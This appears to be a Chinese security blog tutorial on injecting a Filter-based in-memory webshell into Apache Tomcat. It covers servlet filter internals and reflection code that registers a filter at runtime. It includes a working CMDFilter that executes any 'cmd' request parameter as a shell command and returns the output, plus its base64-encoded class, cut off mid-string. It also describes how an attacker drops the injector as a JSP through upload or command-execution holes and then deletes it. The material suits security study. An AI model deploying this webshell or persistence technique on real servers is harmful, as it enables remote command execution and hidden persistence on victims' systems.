---
date: 2025-10-09
category:
  - 网络安全
  - Web安全
  - Java
tags:
  - 内存马
  - Tomcat
  - Filter
  - Filter内存马
---

# 通过模拟servletContext.addFilter注册Filter内存马

> [JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#filter-内存马)

---

- [通过模拟servletContext.addFilter注册Filter内存马](#通过模拟servletcontextaddfilter注册filter内存马)
  - [Filter内存马基本知识](#filter内存马基本知识)
  - [配置环境](#配置环境)
  - [创建一个新的Web应用程序](#创建一个新的web应用程序)
  - [注册一个 Servlet 用于动态添加 Filter](#注册一个-servlet-用于动态添加-filter)
  - [制作恶意 Filter 并注入](#制作恶意-filter-并注入)

---

## Filter内存马基本知识

> [JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#filter-内存马)

Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。

通常情况下，Filter 配置在配置文件(`web.xml`)和注解(如 `@WebFilter`)中，在其他代码中如果想要完成注册，主要有以下几种方式：

- 使用 `ServletContext` 的 `addFilter/createFilter` 方法注册

  例如:

  ```java
  FilterRegistration.Dynamic filter = servletContext.addFilter("myFilter", new MyFilter());
  filter.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), true, "/*");
  ```

- 使用 `ServletContextListener` 的 `contextInitialized` 方法在服务器启动时注册

  `ServletContextListener` 是 Java EE 规范中的一种监听器，它可以在服务器启动时执行一些操作。

  通过在 `contextInitialized` 方法中调用 `ServletContext` 的 `addFilter()` 方法，可以在服务器启动时动态注册 `Filter`。

  例如:

  ```java
  public class MyContextListener implements ServletContextListener {
      @Override
      public void contextInitialized(ServletContextEvent sce) {
          ServletContext servletContext = sce.getServletContext();
          FilterRegistration.Dynamic filter = servletContext.addFilter("myFilter", new MyFilter());
          filter.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), true, "/*");
      }
  }
  ```

  > 后续在 Listener 内存马中进行描述

- 使用 `ServletContainerInitializer` 的 `onStartup` 方法在初始化时注册

  `ServletContainerInitializer` 是 Servlet 3.0 中引入的一个接口，允许你在 Web 应用启动时做一些初始化工作。

  在实现 `ServletContainerInitializer` 时，可以通过 `onStartup()` 方法动态注册 `Filter`。

  与 `ServletContextListener` 不同的是，`ServletContainerInitializer` 是通过 SPI（服务提供者接口）机制自动加载的，因此它的调用顺序是由容器控制的，通常用于对整个应用进行初始化配置。

  例如:

  ```java
  public class MyServletInitializer implements ServletContainerInitializer {
      @Override
      public void onStartup(Set<Class<?>> c, ServletContext ctx) throws ServletException {
          FilterRegistration.Dynamic filter = ctx.addFilter("myFilter", new MyFilter());
          filter.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), true, "/*");
      }
  }
  ```

  > 这种注册方式不算严格的“动态”注册，因为它发生在应用初始化阶段，而不是运行时随时可以改变。

---

本节只讨论使用 ServletContext 添加 Filter 内存马的方法。

首先来看一下 `createFilter` 方法，按照注释，这个类用来在调用 `addFilter` 向 ServletContext 实例化一个指定的 Filter 类。

![img](http://cdn.ayusummer233.top/DailyNotes/202409241528634.png)

这个类还约定了一个事情，那就是如果这个 ServletContext 传递给 ServletContextListener 的 `ServletContextListener.contextInitialized` 方法，该方法既未在 `web.xml` 或 `web-fragment.xml` 中声明，也未使用 `javax.servlet.annotation.WebListener` 进行注释，则会抛出 `UnsupportedOperationException` 异常，这个约定其实是非常重要的一点。

> 也即 Listener 必须在静态上下文中定义，具体来说，应该在 `web.xml` 文件或使用 `@WebListener` 注解进行声明。这种设计确保了在应用启动时，所有的监听器都已经明确配置好，从而避免了动态添加可能带来的不确定性和错误。
>
> ---
>
> 我们利用此项做内存马注入的话, 首先排除利用 `web.xml` 注册 Listener, 其次注解又不能在 JSP 文件中使用, 因此不能直接使用 `ServletContext.addFilter` 而需要另辟蹊径

---

接下来看 `addFilter` 方法

`ServletContext` 提供了三个重载的 `addFilter` 方法，用于在不同场景下添加 `Filter`。这些方法分别接收以下参数：

- 字符串类型的 `filterName` 和 `Filter` 对象

  `addFilter(String filterName, Filter filter)`

  这个方法接收一个 `filterName` 和一个 `Filter` 实例，用于直接添加一个已经实例化的 `Filter`

  ```java
  Filter myFilter = new MyFilter();
  FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("myFilter", myFilter);
  ```

- 字符串类型的 `filterName` 和 `className` 字符串

  `addFilter(String filterName, String className)` 

  用于添加一个通过类名指定的 `Filter`

  ```java
  FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("myFilter", "com.example.MyFilter");
  ```

- 字符串类型的 `filterName` 和 `Filter` 子类的 `Class` 对象

  `addFilter(String filterName, Class<? extends Filter> filterClass)`

  用于添加一个通过类对象指定的 `Filter`

  ```java
  FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("myFilter", MyFilter.class);
  ```

所有这些方法都会返回一个 `FilterRegistration.Dynamic` 对象，该对象实际上是 `FilterRegistration` 的一个子类，用于进一步配置和管理动态添加的 `Filter`。例如:

```java
FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("myFilter", MyFilter.class);
filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), true, "/*");
filterRegistration.setInitParameter("paramName", "paramValue");
```

---

`addFilter` 方法实际上就是动态添加 filter 的最核心和关键的方法，但是这个类中同样约定了 `UnsupportedOperationException` 异常

由于 Servlet API 只是提供接口定义，具体的实现还要看具体的容器，那我们首先以 Tomcat 7.0.96 为例，看一下具体的实现细节。相关实现方法在 `org.apache.catalina.core.ApplicationContext#addFilter` 中。

![img](http://cdn.ayusummer233.top/DailyNotes/202409241548399.png)

> Tomcat8.5.100 中亦是如此:
>
> ![image-20240927113045257](http://cdn.ayusummer233.top/DailyNotes/202409271130543.png)

可以看到，这个方法创建了一个 FilterDef 对象，将 filterName、filterClass、filter 对象初始化进去，使用 StandardContext 的 `addFilterDef` 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回，并没有将这个 Filter 放到 FilterChain 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。

这时我们肯定要想，能不能直接操纵 FilterChain 呢？FilterChain 在 Tomcat 中的实现是 `org.apache.catalina.core.ApplicationFilterChain`，这个类提供了一个 `addFilter` 方法添加 Filter，这个方法接受一个 ApplicationFilterConfig 对象，将其放在 `this.filters` 中。答案是可以，但是没用，因为对于每次请求需要执行的 FilterChain 都是动态取得的。

> [Filter的基本工作原理](#Filter的基本工作原理)
>
> - `FilterChain` 是 Java Servlet API 中的一个接口，用于表示一组 `Filter` 的链条。每个 `Filter` 都可以在请求到达目标 `Servlet` 之前或响应返回客户端之前对请求和响应进行处理。`FilterChain` 的主要作用是管理和执行这些 `Filter`。
>
> - `FilterChain` 维护了一个过滤器的有序列表，这些过滤器会按顺序对请求和响应进行处理。
> - `FilterChain` 提供了一个 `doFilter` 方法，用于将请求和响应传递给链中的下一个过滤器或最终的目标 `Servlet`。
>
> 每次请求的 `FilterChain` 都是动态取得的，因此直接操作 `FilterChain` 并不能全局影响所有请求。
>
> 强行在一次请求的 `FilterChain` 中添加一个 `Filter`，在该请求处理结束后，这个 `FilterChain` 实例也会被销毁, 相应的添加的 Filter 也会销毁; 每次请求都会生成一个新的 `FilterChain` 实例，这个实例只在当前请求的生命周期内有效, 只会影响当前请求的 `FilterChain` 实例，不会影响其他请求。
>
> **请求生命周期**:
>
> - **请求到达服务器**：当一个请求到达服务器时，服务器会根据请求的 URL 和过滤器的配置动态生成一个新的 `FilterChain` 实例。
> - **执行过滤器链**：服务器依次调用 `FilterChain` 中的每个过滤器的 `doFilter` 方法。
> - **请求处理结束**：当所有过滤器和目标 `Servlet` 处理完请求后，`FilterChain` 实例的生命周期也随之结束。

---

那Tomcat 是如何处理一次请求对应的 FilterChain 的呢？在 ApplicationFilterFactory 的 `createFilterChain` 方法中，可以看到流程如下：

- 在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配；
- 如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig；
- 如果获取到 filterConfig，则将其加入到 filterChain 中
- 后续将会循环 filterChain 中的全部 filterConfig，通过 `getFilter` 方法获取 Filter 并执行 Filter 的 `doFilter` 方法。

通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。

在之前的 ApplicationContext 的 addFilter 中将 filter 初始化存在了 StandardContext 的 filterDefs 中，那后面又是如何添加在其他参数中的呢？

在 StandardContext 的 `filterStart` 方法中生成了 filterConfigs。

![img](http://cdn.ayusummer233.top/DailyNotes/202409241634869.png)

在 ApplicationFilterRegistration 的 `addMappingForUrlPatterns` 中生成了 filterMaps。

![img](http://cdn.ayusummer233.top/DailyNotes/202409241634960.png)

而这两者的信息都是从 filterDefs 中的对象获取的。

在了解了上述逻辑后，在应用程序中动态的添加一个 filter 的思路就清晰了：

- 调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；
- 调用 StandardContext 的 filterStart 方法生成 filterConfigs；
- 调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；
- 为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位。

基于以上思路的实现在 threedr3am 师傅的[这篇文章](https://xz.aliyun.com/t/7388)中有实现代码，这里不再重复

既然知道了需要修改的关键位置，那就没有必要调用方法去改，直接用反射加进去就好了，其中中间还有很多小细节可以变化，但都不是重点，略过。

写一个 demo 模拟一下动态添加一个 filter 的过程。首先我们有一个 IndexServlet，如果请求参数有 id 的话，则打印在页面上。

![img](http://cdn.ayusummer233.top/DailyNotes/202409241644177.png)

---

## 配置环境

保证如下环境已经准备完成:

- 开发环境:

  - [安装了JDK](https://233official.github.io/dailynotes/Language/Java/Java.html#%E5%AE%89%E8%A3%85-jdk)

  - 有一个支持 JavaWeb 开发的 IDE: IDEA, Eclipse, Netbeans, VSCode(这里以VSCode为例)


- 部署环境:
  - [Tomcat](https://233official.github.io/dailynotes/Language/Java/JavaWeb.html#tomcat)
  
    > 使用 `tomcat:8` docker 的时候记得 [改容器时区](https://233official.github.io/dailynotes/通识/Linux/Shell.html#修改时区和时间), 这样看 log 不会纠结时间

---

## 创建一个新的Web应用程序

在你的 IDE 中创建一个新的 Maven 项目

在 VSCode 中可以如此操作:

安装 Extension Pack for Java 扩展:

![image-20240925135623429](http://cdn.ayusummer233.top/DailyNotes/202409251356665.png)

创建 Maven 项目:

![image-20240925135835528](http://cdn.ayusummer233.top/DailyNotes/202409251358667.png)

![image-20240925135939885](http://cdn.ayusummer233.top/DailyNotes/202409251359009.png)

版本选择最新的即可:

![image-20240925140222334](http://cdn.ayusummer233.top/DailyNotes/202409251402475.png)

group id 按需填写, 直接 `com.example` 也行

![image-20240925140504215](http://cdn.ayusummer233.top/DailyNotes/202409251405330.png)

填写 `artifact id`

> - Maven 项目中，`artifactId` 代表了项目的唯一标识符, 通常也是项目的名称, 通常与 `groupId` 结合使用来唯一标识一个项目。
>
>   Maven 会使用它来命名生成的构建工件（如 JAR 或 WAR 文件）。
>
> - `artifactId` 通常是项目的名称，应该简洁明了，能够反映项目的功能或目的
>
>   通常使用小写字母和短横线（`-`）来分隔单词例如，如果此项目是一个动态过滤器示例，可以使用 `dynamic-filter-demo` 作为 `artifactId`

![image-20240925141007920](http://cdn.ayusummer233.top/DailyNotes/202409251410010.png)

---

选择一个目录放置此项目:

![image-20240925141214216](http://cdn.ayusummer233.top/DailyNotes/202409251412338.png)

![image-20240925142411408](http://cdn.ayusummer233.top/DailyNotes/202409251424521.png)

![image-20240925142805115](http://cdn.ayusummer233.top/DailyNotes/202409251428228.png)

按照如下结构组织此 Web 应用目录(主要关注下图框选的四个文件, 另外一个 index.jsp 是自动生成的, 可有可无):

![image-20240925165404322](http://cdn.ayusummer233.top/DailyNotes/202409251654434.png)

---

- dynamic-filter-demo
  - `src/main`
    - `java/com/summer233`
      - [DemoServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/DemoServlet.java)
      - [IndexServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/IndexServlet.java)
    - `webapp/WEB-INF`
      - [web.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/webapp/WEB-INF/web.xml)
  - [pom.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/pom.xml)

> PS: 上面的超链接指向的就是对应的源码

> 上面两个 Servlet 文件以两种方式配置了两个Servlet:
>
> - 通过 `web.xml` 配置:
>
>   ![image-20240926034440772](http://cdn.ayusummer233.top/DailyNotes/202409260344967.png)
>
> - 通过注解配置:
>
>   ![image-20240926034511610](http://cdn.ayusummer233.top/DailyNotes/202409260345803.png)

---

然后编译打包生成 war:

```bash
mvn clean package
```

这个命令将执行以下操作：

1. **清理**：删除之前的构建产物，确保从干净的状态开始。
2. **编译**：编译项目的源代码。
3. **测试**：运行项目的单元测试（如果有的话）。
4. **打包**：将编译后的代码打包成一个 WAR 文件，通常会放在项目的 `target` 目录下。

![image-20240926033528360](http://cdn.ayusummer233.top/DailyNotes/202409260335549.png)

---

将上面的 war 包 copy 到 Tomcat 的 webapps 目录下, Tomcat 会自动解压部署此 war 包

![image-20240926033750986](http://cdn.ayusummer233.top/DailyNotes/202409260337170.png)

对应的日志可以在 catalina log 中查看

> 这个日志文件是 Catalina（Tomcat的核心组件）的主日志文件，记录了Tomcat服务器的启动、停止和运行过程中发生的各种事件和错误。

---

然后就可以访问我们在上面设置的两个路由了:

- `http://127.0.0.1:8089/dynamic-filter-demo-1.0-SNAPSHOT/demo`

  ![image-20240926034139482](http://cdn.ayusummer233.top/DailyNotes/202409260341634.png)

- `/dynamic-filter-demo-1.0-SNAPSHOT/id`

  ![image-20240926034044482](http://cdn.ayusummer233.top/DailyNotes/202409260340633.png)

  ![image-20240926034206224](http://cdn.ayusummer233.top/DailyNotes/202409260342395.png)

---

## 注册一个 Servlet 用于动态添加 Filter

dynamic-filter-demo

- `src/main`
  - `java/com/summer233`
    - [DemoServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/DemoServlet.java)
    - [IndexServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/IndexServlet.java)
    - (**新增**)[DynamicUtils.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/DynamicUtils.java)
    - (**新增**)[AddTomcatFilter.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/AddTomcatFilter.java)
  - `webapp/WEB-INF`
    - [web.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/webapp/WEB-INF/web.xml)
- [pom.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/pom.xml)

---

编写一个基础的 Filter, 作用是打印提示信息, 例如:

```java
package com.summer233;

import java.io.IOException;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class BasicFilter implements Filter {
    public BasicFilter() {
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
            throws IOException, ServletException {
        servletResponse.getWriter().println("this is a filter");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    }
}

```

跑一遍 `mvn clean package`, 目的是拿到这个 FIlter 的 class 文件

![image-20240926172316206](http://cdn.ayusummer233.top/DailyNotes/202409261723336.png)

---

接下来需要将这个 class 文件转换成 base64字符串以用于后续注入

```java
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

public class ClassToBase64 {
    public static void main(String[] args) {
        try {
            // 读取.class文件
            File file = new File("resource/BasicFilter.class");
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();

            // 将字节数组进行Base64编码
            String encoded = Base64.getEncoder().encodeToString(bytes);

            // 输出Base64编码后的字符串
            System.out.println(encoded);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

![image-20240926172659937](http://cdn.ayusummer233.top/DailyNotes/202409261727343.png)

---

编写一个函数用于读取 class base64字符串然后解码,反射加载,返回相应的class对象:

![image-20240926173815680](http://cdn.ayusummer233.top/DailyNotes/202409261738805.png)

---

编写 Servlet, 其 `doGet` 方法的作用就是动态加载 Base64编码字符串的 class 对应的 Filter

![image-20240926174308866](http://cdn.ayusummer233.top/DailyNotes/202409261743995.png)

> 相应的对于攻击者而言, 可以将这个代码写成一个 jsp 文件通过命令执行或者文件上传漏洞写到服务器Tomcat的webapps目录下, 然后访问这个 jsp 路径自动触发 Filter 注册, 然后将此 jsp 删掉完成一次内存马注入的流程

---

`doGet` 动态注册 Filter:

---

**获取 `ServletContext` 对象**：从请求中获取 `ServletContext`

**检查 Filter 是否已存在**：如果不存在，则继续添加 Filter。

![image-20240926175541567](http://cdn.ayusummer233.top/DailyNotes/202409261755703.png)

---

**获取 `StandardContext`对象**：通过反射从 `ServletContext`中获取 `StandardContext`

![image-20240926181939950](http://cdn.ayusummer233.top/DailyNotes/202409261819057.png)

我们可以通过请求获取到 ServletContext, 但是他提供的是Web应用的通用接口, 是 StandardContext 的高层次抽象, 动态添加过滤器是一个更底层的操作, 我们需要获取到 StandardContext 实例来访问和修改 Web 应用的内部底层配置

由于 StandardContext 是 Tomcat 的内部类, 通常情况下无法直接访问, 因此需要通过反射来绕过这层限制来获取到对应的 StandardContext

> `StandardContext`:
>
> ![image-20240926181428653](http://cdn.ayusummer233.top/DailyNotes/202409261814942.png)
>
> `ServletContext`:
>
> ![image-20240926181821542](http://cdn.ayusummer233.top/DailyNotes/202409261818805.png)

---

获取当前 ServletContext 中的 context 字段的值, 以便进一步获取 StandardContext 对象

![image-20240926183927321](http://cdn.ayusummer233.top/DailyNotes/202409261839438.png)

`ServletContext` 是一个接口，提供了与 Servlet 容器交互的方法和属性。`context` 字段通常是 `ServletContext` 实现类中的一个私有字段，用于存储与当前 Web 应用相关的上下文信息。

在 Tomcat 的实现中，这个字段可能指向一个 `StandardContext` 对象，该对象包含了 Web 应用的配置信息和状态。

> 在 Java 反射机制中，`Field` 对象表示类的某个字段。要获取某个对象的特定字段的值，需要使用 `Field`对象的 `get`方法，并传入包含该字段的对象实例。`f.get(servletContext)` 的作用是从 `servletContext`对象中获取 `f` 字段的值
>
> ![image-20240926183722635](http://cdn.ayusummer233.top/DailyNotes/202409261837984.png)

然后通过一个 while 循环一层层往上翻直到找到 StandardContext 赋给 o:

![image-20240926184349207](http://cdn.ayusummer233.top/DailyNotes/202409261843334.png)

---

创建 FIlterDef 对象, 设置 FIlter 名称,实例以及类名

```java
// 创建 FilterDef 对象
FilterDef filterDef = new FilterDef();
filterDef.setFilterName(filterName);
// filterDef.setFilter((Filter) filterClass.newInstance());
filterDef.setFilter((Filter) filterClass.getDeclaredConstructor().newInstance());
filterDef.setFilterClass(filterClass.getName());
```

---

创建 ApplicationFilterConfig 对象(使用刚才创建的 FilterDef 配置过滤器)

```java
// 创建 ApplicationFilterConfig 对象
Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
constructor[0].setAccessible(true);
ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(o, filterDef);
```

> 通过 `constructor[0].setAccessible(true)` 将数组中的第一个构造函数设置为可访问(即使它是私有函数), 这一步是必要的，因为反射机制默认不允许访问私有构造函数。

---

创建与配置 FilterMap 对象

```java
// 创建 FilterMap 对象
FilterMap filterMap = new FilterMap();
filterMap.setFilterName(filterName);
// filterMap.addURLPattern("*"); // 这是错误的
// URL 匹配所有路径
filterMap.addURLPattern("/*");
// 设置调度类型为 REQUEST。这意味着过滤器将应用于所有请求调度类型。
filterMap.setDispatcher(DispatcherType.REQUEST.name());
```

---

通过反射机制将一个 ApplicationFilterConfig 对象放入 StandardContext 类的 filterConfigs 字段中

```java
// 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
// 从 StandardContext 中虎获取 filterConfigs 字段(存储了过滤器配置的映射关系)
Field filterConfigsField = o.getClass().getDeclaredField("filterConfigs");
filterConfigsField.setAccessible(true);
// HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String,
// ApplicationFilterConfig>) filterConfigsField
// .get(o);
// 上面注释的代码可能会因为强制类型转换引发警告, 使用如下注解可以抑制警告
@SuppressWarnings("unchecked")
// 获取 filterConfigs 字段的值用强制类型转换创建一个新的 HashMap 对象
HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigsField
    .get(o);
// 将新的过滤器配置添加到 filterConfigs 映射中, filterName 是过滤器的名称，config 是对应的 ApplicationFilterConfig 对象
filterConfigs.put(filterName, config);
```

---

通过反射机制将 FilterMap 对象放入 StandardContext 类的 filterMaps 字段中

```java
// 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
Field filterMapField = o.getClass().getDeclaredField("filterMaps");
filterMapField.setAccessible(true);
Object object = filterMapField.get(o);
// Class cl =
// Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
Class<?> cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
// addBefore 将 filter 放在第一位
Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
// Method m = cl.getDeclaredMethod("add", FilterMap.class);
m.setAccessible(true);
// 将前面通过反射创建的 filtermap 通过 addbefore 方法添加到 filterMaps 最前面
m.invoke(object, filterMap);
```

---

至此便完成了动态添加 Filter 的过程, 运行 `mvn clean package` 打包应用然后将 war 包拷贝到 Tomcat 的 webapps 目录下, Tomcat 会自动解压部署此应用:

![image-20240927160543241](http://cdn.ayusummer233.top/DailyNotes/202409271605493.png)

访问 `/dynamic-filter-demo-1.1.2/addFilter` 可以看到 Filter 已经注册成功了:

![image-20240927160619536](http://cdn.ayusummer233.top/DailyNotes/202409271606696.png)

之后访问其他路由可以看到这个 filter 都有触发:

![image-20240927160859596](http://cdn.ayusummer233.top/DailyNotes/202409271608752.png)

---

## 制作恶意 Filter 并注入

```java
package com.summer233;

import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

public class CMDFilter implements Filter {
    public CMDFilter() {
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
            throws IOException, ServletException {
        servletResponse.setContentType("text/html; charset=UTF-8");
        servletResponse.setCharacterEncoding("UTF-8");
        servletResponse.getWriter().println("this is a filter");
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[] { "sh", "-c", req.getParameter("cmd") }
                    : new String[] { "cmd.exe", "/c", req.getParameter("cmd") };
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    }
}

```

编译生成 class, 转换为 base64 字符串

```txt
yv66vgAAAEEAoQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAEHRoaXMgaXMgYSBmaWx0ZXIKABsAHAcAHQwAHgAOAQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4HACABACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0CAAiAQADY21kCwAfACQMACUAJgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7CAAoAQAHb3MubmFtZQoAKgArBwAsDAAtACYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkKAC8AMAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsIADUBAAN3aW4KAC8ANwwAOAA5AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoIADsBAAJzaAgAPQEAAi1jCAA/AQAHY21kLmV4ZQgAQQEAAi9jCgBDAEQHAEUMAEYARwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoAQwBJDABKAEsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoATQBOBwBPDABQAFEBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAFMBABFqYXZhL3V0aWwvU2Nhbm5lcgoAUgBVDAAFAFYBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAFgBAAJcYQoAUgBaDABbAFwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAFIAXgwAXwBgAQAHaGFzTmV4dAEAAygpWgoAUgBiDABjADMBAARuZXh0CABlAQAACgAbAGcMAGgADgEABXdyaXRlCgAbAGoMAGsABgEABWZsdXNoCwBtAG4HAG8MAHAAcQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAAhkb0ZpbHRlcgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHAHMBABdjb20vc3VtbWVyMjMzL0NNREZpbHRlcgcAdQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABlMY29tL3N1bW1lcjIzMy9DTURGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEADVN0YWNrTWFwVGFibGUHAIUHAJYBABNqYXZhL2lvL0lucHV0U3RyZWFtBwCYAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEACkV4Y2VwdGlvbnMHAJsBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwCdAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhj